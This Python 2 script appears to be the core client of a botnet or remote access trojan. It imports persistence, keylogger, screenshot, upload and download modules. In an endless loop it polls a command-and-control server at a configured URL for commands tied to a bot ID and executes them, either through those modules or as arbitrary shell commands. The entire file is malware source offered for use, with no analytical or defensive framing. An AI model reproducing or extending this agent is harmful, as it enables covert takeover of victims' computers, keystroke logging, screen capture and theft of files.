#!/usr/bin/env python

import time
import os
import requests
import sys

import settings
from modules import runcmd
from modules import persistence
from modules import download
from modules import upload
from modules import keylogger
from modules import screenshot


if __name__ == "__main__":
    last_active = time.time()
    is_idle = False
    while 1:
        if is_idle:
            time.sleep(settings.REQUEST_INTERVAL)
        try:
            command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID).text
            cmdargs = command.split(" ")
            if command:
                if settings.DEBUG:
                    print command
                if cmdargs[0] == "cd":
                    os.chdir(" ".join(cmdargs[1:]))
                if "modules.%s" % cmdargs[0] in sys.modules:
                    sys.modules["modules.%s" % cmdargs[0]].run(*cmdargs[1:])
                else:
                    runcmd.run(command)
                last_active = time.time()
                is_idle = False
            elif time.time() - last_active > settings.IDLE_TIME:
                is_idle = True
        except Exception, exc:
            is_idle = True
            if settings.DEBUG:
                print exc
